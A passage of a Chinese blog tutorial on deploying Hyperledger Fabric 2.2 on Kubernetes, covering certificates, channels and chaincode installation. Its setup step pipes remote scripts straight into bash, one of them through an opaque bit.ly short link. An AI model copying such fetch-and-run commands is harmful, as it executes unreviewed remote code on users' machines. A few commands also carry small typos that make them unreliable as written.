\</span><br><span class="line">    --registry-mirror=https://xxxxx.mirror.aliyuncs.com</span><br></pre></td></tr></table></figure>

<ul>
<li><input checked disabled type="checkbox"> 安装 kubectl 工具</li>
<li><input checked disabled type="checkbox"> 安装 git</li>
<li><input checked disabled type="checkbox"> 安装 docker</li>
<li><input checked disabled type="checkbox"> 安装 hyperledger 相关命令列工具</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 执行以下指令下载 Hyperledger 命令列工具</span></span><br><span class="line">curl -sSL http://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap.sh | bash -s -- 2.2.0 1.5.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">curl -sSL https://bit.ly/2ysbOFE | bash -s</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设定环境变数至下载下来的 bin 目录下</span></span><br><span class="line">export PATH=&lt;path to download location&gt;/bin:$PATH</span><br></pre></td></tr></table></figure>

<p>以上脚本会在本地下载k8s部署需要的容器和可执行文件，云上的话需要准备的镜像如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">centos:latest</span><br><span class="line">hyperledger/fabric-orderer:2.2</span><br><span class="line">hyperledger/fabric-peer:2.2.0</span><br><span class="line">hyperledger/fabric-tools:2.2.0</span><br></pre></td></tr></table></figure>
<p>用于测试的chaincode镜像，marbles是hyperledger官方给的一个sample，但是源码没有打镜像，这里其他人打的一个镜像，我们只是用来测试部署是否成功，之后会用我们开发的存证chaincode镜像替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paragones&#x2F;chaincode-marbles:1.0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个名为 hyperledger 的 namespace</span></span><br><span class="line">kubectl create namespace hyperledger</span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换至 hyperledger namespace </span></span><br><span class="line">kubectl config set-context --current --namespace=hyperledger</span><br></pre></td></tr></table></figure>
<h3 id="二、系统架构规划"><a href="#二、系统架构规划" class="headerlink" title="二、系统架构规划"></a>二、系统架构规划</h3><h4 id="2-1-节点规划"><a href="#2-1-节点规划" class="headerlink" title="2.1 节点规划"></a>2.1 节点规划</h4><p>下图为本范例的部署架构，所有hyperledger 所需节点皆部署于 k8s 中的 hyperledger namespace 当中。架构中包含的节点如下</p>
<ul>
<li>orderer0 : 排序节点0，用于排序区块</li>
<li>orderer1 : 排序节点1，用于排序区块</li>
<li>orderer2 : 排序节点2，用于排序区块</li>
<li>peer0-org1 : 组织1的Peer节点，用于区块的实际运算、背书以及记帐。</li>
<li>cli-org1-peer : 用于操纵组织1的Peer节点</li>
<li>peer0-org2 : 组织2的Peer节点，用于区块的实际运算、背书以及记帐。</li>
<li>cli-org2-peer : 用于操纵组织2的Peer节点  </li>
</ul>
<p><img src="/2021/08/09/%E9%83%A8%E7%BD%B2fabric%E4%BA%8Ek8s%E4%B9%8B%E4%B8%8A/1.jpg"></p>
<h4 id="2-2-存储存放规划"><a href="#2-2-存储存放规划" class="headerlink" title="2.2 存储存放规划"></a>2.2 存储存放规划</h4><table>
<thead>
<tr>
<th>节点</th>
<th>挂载路径</th>
<th>路径说明</th>
<th>PVC</th>
<th>PV hostPath</th>
</tr>
</thead>
<tbody><tr>
<td>orderer0</td>
<td>/var/hyperledger/orderer/</td>
<td>存放凭证</td>
<td>orderer0-pvc</td>
<td>./fabric/orderer0</td>
</tr>
<tr>
<td>orderer0</td>
<td>/var/hyperledger/production</td>
<td>持久化资料</td>
<td>orderer0-persist-pvc</td>
<td>./fabric/orderer0persist</td>
</tr>
<tr>
<td>orderer1</td>
<td>/var/hyperledger/orderer/</td>
<td>存放凭证</td>
<td>orderer1-pvc</td>
<td>./fabric/orderer1</td>
</tr>
<tr>
<td>orderer1</td>
<td>/var/hyperledger/production</td>
<td>持久化资料</td>
<td>orderer1-persist-pvc</td>
<td>./fabric/orderer1persist</td>
</tr>
<tr>
<td>orderer2</td>
<td>/var/hyperledger/orderer/</td>
<td>存放凭证</td>
<td>orderer2-pvc</td>
<td>./fabric/orderer2</td>
</tr>
<tr>
<td>orderer2</td>
<td>/var/hyperledger/production</td>
<td>持久化资料</td>
<td>orderer2-persist-pvc</td>
<td>./fabric/orderer2persist</td>
</tr>
<tr>
<td>Org1-Peer</td>
<td>/etc/hyperledger/fabric/</td>
<td>存放凭证</td>
<td>peer0-org1-pvc</td>
<td>./fabric/peer0org1</td>
</tr>
<tr>
<td>Org1-Peer</td>
<td>/var/hyperledger/production</td>
<td>持久化资料</td>
<td>peer0-org1-persist-pvc</td>
<td>./fabric/peer0org1persist</td>
</tr>
<tr>
<td>Org1-Peer-CLI</td>
<td>/opt/gopath/src/github.com/ hyperledger/fabric/peer/crypto/</td>
<td>存放凭证</td>
<td>peer0-org1-pvc</td>
<td>./fabric/peer0org1</td>
</tr>
<tr>
<td>Org2-Peer</td>
<td>/etc/hyperledger/fabric/</td>
<td>存放凭证</td>
<td>peer0-org2-pvc</td>
<td>./fabric/peer0org2</td>
</tr>
<tr>
<td>Org2-Peer</td>
<td>/var/hyperledger/production</td>
<td>持久化资料</td>
<td>peer0-org2-persist-pvc</td>
<td>./fabric/peer0org2persist</td>
</tr>
<tr>
<td>Org2-Peer-CLI</td>
<td>/opt/gopath/src/github.com/ hyperledger/fabric/peer/crypto/</td>
<td>存放凭证</td>
<td>peer0-org1-pvc</td>
<td>./fabric/peer0org2</td>
</tr>
</tbody></table>
<h3 id="三、准备凭证"><a href="#三、准备凭证" class="headerlink" title="三、准备凭证"></a>三、准备凭证</h3><p>Hyperledger Fabric 于节点沟通时必须依赖凭证进行沟通，因此必须先签发凭证。在凭证的签发过程中可以使用两种方式签发凭证</p>
<ul>
<li>cryptogen 命令<br>cryptogen 为 Hyperledger Fabric 生成凭证的命令列工具，于 crypto-config.yaml 定义 Orderer 以及各组织的Peer的数量。</li>
<li>fabric-ca 服务<br>Fabric CA 是一个为 Hyperledger Fabric 签发凭证的工具，通常每个组织会有自己的 Fabric CA，通過fabric-ca client 获得凭证后，就可以用这些凭证访问Peer。</li>
</ul>
<p>在此范例中将以 cryptogen 命令列生成各节点所需凭证，以下为签发凭证的指令。可以查看 git repo 中的 crypto-config.yaml 为<strong>签发凭证设定文件</strong>，crypto-config则为<strong>签发结果</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cryptogen generate --config=crypto-config.yaml --output ./crypto-config</span><br></pre></td></tr></table></figure>

<p>（notice：练习中，需要再次生成新的凭证设定文件时，需要将./crypto-config文件夹删除后，再行运行上述命令。否则凭证设定文件不会被更新覆盖！)</p>
<h3 id="四、准备创世区块"><a href="#四、准备创世区块" class="headerlink" title="四、准备创世区块"></a>四、准备创世区块</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">configtxgen -profile TwoOrgsOrdererGenesis -channelID devchan -outputBlock ./channel-artifacts/genesis.block</span><br></pre></td></tr></table></figure>

<h3 id="五、产生Channel-所需档案"><a href="#五、产生Channel-所需档案" class="headerlink" title="五、产生Channel 所需档案"></a>五、产生Channel 所需档案</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 产生Channel 所需档案</span></span><br><span class="line">configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID &quot;mychannel&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 产生 Org1 使用的 channel 设定文件</span></span><br><span class="line">configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/org1Anchors.tx  -channelID &quot;mychannel&quot; -asOrg org1MSP</span><br><span class="line"><span class="meta">#</span><span class="bash"> 产生 Org2 使用的 channel 设定文件</span></span><br><span class="line">configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/org2Anchors.tx  -channelID &quot;mychannel&quot; -asOrg org2MSP</span><br></pre></td></tr></table></figure>

<h3 id="六、同步档案至PV中"><a href="#六、同步档案至PV中" class="headerlink" title="六、同步档案至PV中"></a>六、同步档案至PV中</h3><p>在前述三、四、五章节中我们已经准备了以下内容</p>
<ul>
<li>各节点所需凭证</li>
<li>创世区块</li>
<li>Channel 设定档</li>
</ul>
<p>由于 Hyperledger 之 container 必须先将以上档案放置至正确位置后 container 才能正常启动。但本次安装不使用NFS 预先将档案填入，而是先启临时的 container 同步档案。<br>在本步骤我们将启动两个用于填充档案的 container</p>
<table>
<thead>
<tr>
<th>container 名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>orderer-bastion</td>
<td>填充 orderer0-pvc,orderer1-pvc,orderer2-pvc 所需要的文档</td>
</tr>
<tr>
<td>peer-bastion</td>
<td>填充 peer0-org1-pvc,peer0-org2-pvc 所需要的文档</td>
</tr>
</tbody></table>
<p>以下为同步文档的步骤</p>
<p><strong>6.1 启动临时 container</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create -f /deploy-hyperledger-fabric-on-k8s/file-populate-bastion/</span><br></pre></td></tr></table></figure>
<p>这个指令将会产生 pv/pvc/orderer-bastion/peer-bastion 这些资源</p>
<p><strong>6.2 同步 Orderer 所需文档</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录进入 orderer-bastion</span></span><br><span class="line">kubectl exec -it $&#123;orderer-bastion-pod-name&#125; bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装 git 并 <span class="built_in">clone</span> deploy-hyperledger-fabric-on-k8s repo</span></span><br><span class="line">yum install git -y </span><br><span class="line">git clone https://github.com/willzhuang/deploy-hyperledger-fabric-on-k8s.git</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer0 创世区块</span></span><br><span class="line">cp deploy-hyperledger-fabric-on-k8s/channel-artifacts/genesis.block /orderer0-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer0 凭证</span></span><br><span class="line">cp -r deploy-hyperledger-fabric-on-k8s/crypto-config/ordererOrganizations/consortium/orderers/orderer0/* /orderer0-pvc/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer1 创世区块</span></span><br><span class="line">cp deploy-hyperledger-fabric-on-k8s/channel-artifacts/genesis.block /orderer1-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer1 凭证</span></span><br><span class="line">cp -r deploy-hyperledger-fabric-on-k8s/crypto-config/ordererOrganizations/consortium/orderers/orderer1/* /orderer1-pvc/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer2 创世区块</span></span><br><span class="line">cp deploy-hyperledger-fabric-on-k8s/channel-artifacts/genesis.block /orderer2-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 orderer2 凭证</span></span><br><span class="line">cp -r deploy-hyperledger-fabric-on-k8s/crypto-config/ordererOrganizations/consortium/orderers/orderer2/* /orderer2-pvc/</span><br></pre></td></tr></table></figure>

<p><strong>6.3 同步 Peer 所需要的文档</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录进入 peer-bastion</span></span><br><span class="line">kubectl exec -it $&#123;peer-bastion-pod-name&#125; bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装 git 並 <span class="built_in">clone</span> deploy-hyperledger-fabric-on-k8s repo</span></span><br><span class="line">yum install git -y </span><br><span class="line">git clone https://github.com/willzhuang/deploy-hyperledger-fabric-on-k8s.git</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org1 peer0 所需之凭证</span></span><br><span class="line">cp -r /deploy-hyperledger-fabric-on-k8s/crypto-config/peerOrganizations/org1/peers/peer0-org1/* peer0-org1-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org1 peer0 cli 所需之凭证</span></span><br><span class="line">cp -r /deploy-hyperledger-fabric-on-k8s/crypto-config/* /peer0-org1-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org1 peer0 所需之 channel设定文档</span></span><br><span class="line">cp /deploy-hyperledger-fabric-on-k8s/channel-artifacts/* peer0-org1-pvc/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org2 peer0 所需之凭证</span></span><br><span class="line">cp -r /deploy-hyperledger-fabric-on-k8s/crypto-config/peerOrganizations/org2/peers/peer0-org2/* peer0-org2-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org2 peer0 cli 所需之凭证</span></span><br><span class="line">cp -r /deploy-hyperledger-fabric-on-k8s/crypto-config/* /peer0-org2-pvc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 同步 org2 peer0 所需之 channel设定文档</span></span><br><span class="line">cp /deploy-hyperledger-fabric-on-k8s/channel-artifacts/* peer0-org2-pvc/</span><br></pre></td></tr></table></figure>

<h3 id="七、启动-Orderer"><a href="#七、启动-Orderer" class="headerlink" title="七、启动 Orderer"></a>七、启动 Orderer</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动 orderer cluster</span></span><br><span class="line">kubectl create -f /deploy-hyperledger-fabric-on-k8s/orderer/</span><br></pre></td></tr></table></figure>
<p>內含 orderer0,orderer1,orderer2 所需的 deployment 与 service 资源</p>
<h3 id="八、启动-Peer"><a href="#八、启动-Peer" class="headerlink" title="八、启动 Peer"></a>八、启动 Peer</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动 org1 peer0 </span></span><br><span class="line">kubectl create -f /deploy-hyperledger-fabric-on-k8s/org1/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 內含 org1 peer0/cli 所需的 deployment,configmap,service 资源</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 org2 peer0 </span></span><br><span class="line">kubectl create -f /deploy-hyperledger-fabric-on-k8s/org2/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 內含 org2 peer0/cli 所需的 deployment,configmap,service 资源</span></span><br></pre></td></tr></table></figure>

<h3 id="九、创建channel"><a href="#九、创建channel" class="headerlink" title="九、创建channel"></a>九、创建channel</h3><p><strong>9.1 将 org1 peer0 加入 channel</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录进入 cli pod </span></span><br><span class="line">kubectl exec -it $&#123;org1-peer0-cli-pod-name&#125; sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 产生 channel 区块</span></span><br><span class="line">peer channel create -o orderer0:7050 -c mychannel -f ./scripts/channel-artifacts/channel.tx --tls true --cafile $ORDERER_CA</span><br></pre></td></tr></table></figure>

<p>运行成功后，log信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/opt/gopath/src/github.com/hyperledger/fabric/peer # peer channel create -o orderer0:7050 -c mychannel -f ./scripts/channel-artifacts/channel.tx -</span><br><span class="line">-tls true --cafile $ORDERER_CA</span><br><span class="line">2021-08-10 05:41:03.212 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:03.242 UTC [cli.common] readBlock -&gt; INFO 002 Expect block, but got status: &amp;&#123;NOT_FOUND&#125;</span><br><span class="line">2021-08-10 05:41:03.246 UTC [channelCmd] InitCmdFactory -&gt; INFO 003 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:03.447 UTC [cli.common] readBlock -&gt; INFO 004 Expect block, but got status: &amp;&#123;SERVICE_UNAVAILABLE&#125;</span><br><span class="line">2021-08-10 05:41:03.450 UTC [channelCmd] InitCmdFactory -&gt; INFO 005 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:03.651 UTC [cli.common] readBlock -&gt; INFO 006 Expect block, but got status: &amp;&#123;SERVICE_UNAVAILABLE&#125;</span><br><span class="line">2021-08-10 05:41:03.654 UTC [channelCmd] InitCmdFactory -&gt; INFO 007 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:03.857 UTC [cli.common] readBlock -&gt; INFO 008 Expect block, but got status: &amp;&#123;SERVICE_UNAVAILABLE&#125;</span><br><span class="line">2021-08-10 05:41:03.866 UTC [channelCmd] InitCmdFactory -&gt; INFO 009 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:04.068 UTC [cli.common] readBlock -&gt; INFO 00a Expect block, but got status: &amp;&#123;SERVICE_UNAVAILABLE&#125;</span><br><span class="line">2021-08-10 05:41:04.070 UTC [channelCmd] InitCmdFactory -&gt; INFO 00b Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:04.273 UTC [cli.common] readBlock -&gt; INFO 00c Expect block, but got status: &amp;&#123;SERVICE_UNAVAILABLE&#125;</span><br><span class="line">2021-08-10 05:41:04.277 UTC [channelCmd] InitCmdFactory -&gt; INFO 00d Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:41:04.480 UTC [cli.common] readBlock -&gt; INFO 00e Received block: 0</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 加入 channel</span></span><br><span class="line">peer channel join -b mychannel.block</span><br></pre></td></tr></table></figure>

<p>运行成功后，log信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/opt/gopath/src/github.com/hyperledger/fabric/peer # peer channel join -b mychannel.block</span><br><span class="line">2021-08-10 05:48:59.716 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 05:48:59.736 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看是否在 channel 当中</span></span><br><span class="line">peer channel list</span><br></pre></td></tr></table></figure>
<p><strong>9.2 將 org2 peer0 加入 channel</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 登录进入 cli pod </span><br><span class="line">kubectl exec -it pod $&#123;org2-peer0-cli-pod-name&#125; sh</span><br><span class="line"></span><br><span class="line"># 取得 channel 区块</span><br><span class="line">peer channel fetch 0 mychannel.block -c mychannel -o orderer0:7050 --tls --cafile $ORDERER_CA</span><br><span class="line"></span><br><span class="line"># 加入 channel</span><br><span class="line">peer channel join -b mychannel.block</span><br><span class="line"></span><br><span class="line"># 查看是否在 channel 当中</span><br><span class="line">peer channel list</span><br></pre></td></tr></table></figure>


<p>运行成功后，log信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/opt/gopath/src/github.com/hyperledger/fabric/peer # peer channel fetch 0 mychannel.block -c mychannel -o orderer0:7050 --tls --cafile $ORDERER_CA</span><br><span class="line">2021-08-10 06:05:04.550 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 06:05:04.553 UTC [cli.common] readBlock -&gt; INFO 002 Received block: 0</span><br><span class="line">/opt/gopath/src/github.com/hyperledger/fabric/peer # peer channel join -b mychannel.block</span><br><span class="line">2021-08-10 06:05:16.493 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2021-08-10 06:05:16.513 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">/opt/gopath/src/github.com/hyperledger/fabric/peer # peer channel list</span><br><span class="line">2021-08-10 06:05:24.222 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">Channels peers has joined: </span><br><span class="line">mychannel</span><br></pre></td></tr></table></figure>

<h3 id="十、Fabric节点上安装外的Chaincode"><a href="#十、Fabric节点上安装外的Chaincode" class="headerlink" title="十、Fabric节点上安装外的Chaincode"></a>十、Fabric节点上安装外的Chaincode</h3><p><strong>10.1 安装chaincode</strong><br>‘marbles’ 链码作为范例</p>
<p>打包org1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入github的chaincode/packaging</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将connection.json 打包成为 code.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar cfz code.tar.gz connection.json</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">再將code.tar.gz metadata.json包成marbles-org1.tgz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar cfz marbles-org1.tgz code.tar.gz metadata.json</span></span><br></pre></td></tr></table></figure>
<p>将org1 tar文档安装到peer cli pod中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 将marbles-org1.tgz放入peer pod</span><br><span class="line">kubectl cp marbles-org1.tgz hyperledger&#x2F;$&#123;cli-org1-name&#125;:&#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer</span><br><span class="line"></span><br><span class="line"># 登录进入$&#123;cli-org1-name&#125; pod</span><br><span class="line">kubectl exec -it $&#123;cli-org1-name&#125; -- &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 在peer-cli上安装chaincode</span><br><span class="line">$ peer lifecycle chaincode install marbles-org1.tgz</span><br><span class="line"></span><br><span class="line"># 查询链码，识别字符串</span><br><span class="line">$ peer lifecycle chaincode queryinstalled</span><br></pre></td></tr></table></figure>
<p>打包org2，如打包or1一样的步骤，请修改connection.json中的address</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;address&quot;: &quot;chaincode-marbles-org2.hyperledger:7052&quot;</span><br></pre></td></tr></table></figure>

<p>依照下列打包步骤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rm -f code.tar.gz</span><br><span class="line">$ tar cfz code.tar.gz connection.json</span><br><span class="line">$ tar cfz marbles-org2.tgz code.tar.gz metadata.json</span><br><span class="line">$ peer lifecycle chaincode install marbles-org2.tgz</span><br><span class="line"></span><br><span class="line"># 查询链码，识别字符串</span><br><span class="line">$ peer lifecycle chaincode queryinstalled</span><br></pre></td></tr></table></figure>

<p>至此，已完成外部链码设置。</p>
<hr>
<p><strong>10.2 部署”智能合约”</strong></p>
<p>制作golang的alpine镜像文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker build -t chaincode&#x2F;marbles:1.0 .</span><br><span class="line"></span><br><span class="line"># 将文件推送至dockerhub</span><br><span class="line">$ docker login</span><br><span class="line">$ docker push chaincode&#x2F;marbles:1.0</span><br></pre></td></tr></table></figure>

<p>进入github中 chaincode\k8s ，找到org1-chaincode-deployment.yaml和org2-chaincode-deployment.yaml中的CHAINCODE_CCID</p>
<p>将yaml文件中的CHAINCODE_CCID更换成为对应的 chaincode 识别码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 部署 chaincode 到aks上</span><br><span class="line">$ kubectl create -f chaincode&#x2F;k8s</span><br></pre></td></tr></table></figure>
<p>完成部署。</p>
<hr>
<p><strong>10.3审核链码的安装</strong></p>
<p>请在peer-cli-org1/peer-cli-org2 这2个pod中允许链码的安装，记得修改CHAINCODE_CCID<br>※peer-cli-org1 及 peer-cli-org2的CHAINCODE_CCID 需要对应到各自的chaincode识别码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ peer lifecycle chaincode approveformyorg --channelID mychannel --name marbles --version 1.0 --init-required --package-id marbles:e001937433673b11673d660d142c722fc372905db87f88d2448eee42c9c63064 --sequence 1 -o orderer0:7050 --tls --cafile $ORDERER_CA --signature-policy &quot;AND (&#39;org1MSP.peer&#39;,&#39;org2MSP.peer&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>检查所有org允许状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name marbles --version 1.0 --init-require</span><br><span class="line">d --sequence 1 -o -orderer0:7050 --tls --cafile $ORDERER_CA --signature-policy &quot;AND (&#39;org1MSP.peer&#39;,&#39;org2MSP.peer&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>至此，2个peer-cli都审核完毕。</p>
<p>之后提交到channel 中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode commit -o orderer0:7050 --channelID mychannel --name marbles --version 1.0 --sequence 1 --init-required --tls true --cafile $ORDERER_CA --peerAddresses peer0-org1:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org1&#x2F;peers&#x2F;peer0-org1&#x2F;tls&#x2F;ca.crt --peerAddresses peer0-org2:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org2&#x2F;peers&#x2F;peer0-org2&#x2F;tls&#x2F;ca.crt --signature-policy &quot;AND (&#39;org1MSP.peer&#39;,&#39;org2MSP.peer&#39;)&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>10.4测试</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询安装的链码</span><br><span class="line">peer lifecycle chaincode queryinstalled</span><br><span class="line"># 查询审核通过的链码</span><br><span class="line">peer lifecycle chaincode queryapproved --channelID mychannel --name marbles</span><br><span class="line"># 查询提交完成的链码</span><br><span class="line">peer lifecycle chaincode querycommitted --channelID mychannel --name marbles</span><br><span class="line"># 塞弹珠(第一次)</span><br><span class="line">peer chaincode invoke -o orderer0:7050 --isInit --tls true --cafile $ORDERER_CA -C mychannel -n marbles \</span><br><span class="line">--peerAddresses peer0-org1:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org1&#x2F;peers&#x2F;peer0-org1&#x2F;tls&#x2F;ca.crt  \</span><br><span class="line">--peerAddresses peer0-org2:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org2&#x2F;peers&#x2F;peer0-org2&#x2F;tls&#x2F;ca.crt  \</span><br><span class="line">-c &#39;&#123;&quot;Args&quot;:[&quot;initMarble&quot;,&quot;marble1&quot;,&quot;blue&quot;,&quot;35&quot;,&quot;tom&quot;]&#125;&#39; --waitForEvent</span><br><span class="line"># 塞弹珠</span><br><span class="line">peer chaincode invoke -o orderer0:7050 --tls true --cafile $ORDERER_CA -C mychannel -n marbles \</span><br><span class="line">--peerAddresses peer0-org1:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org1&#x2F;peers&#x2F;peer0-org1&#x2F;tls&#x2F;ca.crt \</span><br><span class="line">--peerAddresses peer0-org2:7051 --tlsRootCertFiles &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;peer&#x2F;crypto&#x2F;peerOrganizations&#x2F;org2&#x2F;peers&#x2F;peer0-org2&#x2F;tls&#x2F;ca.crt \</span><br><span class="line">-c &#39;&#123;&quot;Args&quot;:[&quot;initMarble&quot;,&quot;marble5&quot;,&quot;red&quot;,&quot;50&quot;,&quot;tom&quot;]&#125;&#39; --waitForEvent</span><br><span class="line"># 查询弹珠</span><br><span class="line">peer chaincode query -C mychannel -n marbles -c &#39;&#123;&quot;Args&quot;:[&quot;readMarble&quot;,&quot;marble5&quot;]&#125;&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="开发Client-Application"><a href="#开发Client-Application" class="headerlink" title="开发Client Application"></a>开发Client Application</h3><p>目前hyperledger不对外，请使用kubectl port-forward的方式连进去。<br>指令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl port-forward $&#123;pord-id&#125; 7050:7050</span><br></pre></td></tr></table></figure>

<p>参考 <a href="https://github.com/hyperledger/fabric-samples/tree/master/asset-transfer-basic">fabric-samples</a> 中typescript所撰写的范例 ※另有java， go 语言的范例!!</p>
<p>以下为typerscript 范例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">async function main() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        const ccpPath &#x3D; path.resolve(__dirname, &#39;..&#39;, &#39;connection.json&#39;);</span><br><span class="line"></span><br><span class="line">        const fileExists &#x3D; fs.existsSync(ccpPath);</span><br><span class="line">        if (!fileExists) &#123;</span><br><span class="line">            throw new Error(&#39;no such file or directory: $&#123;ccpPath&#125;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        const contents &#x3D; fs.readFileSync(ccpPath, &#39;utf8&#39;);</span><br><span class="line">        console.log(contents);</span><br><span class="line"></span><br><span class="line">        const connectionProfile &#x3D; JSON.parse(contents);</span><br><span class="line">        const gateway &#x3D; new 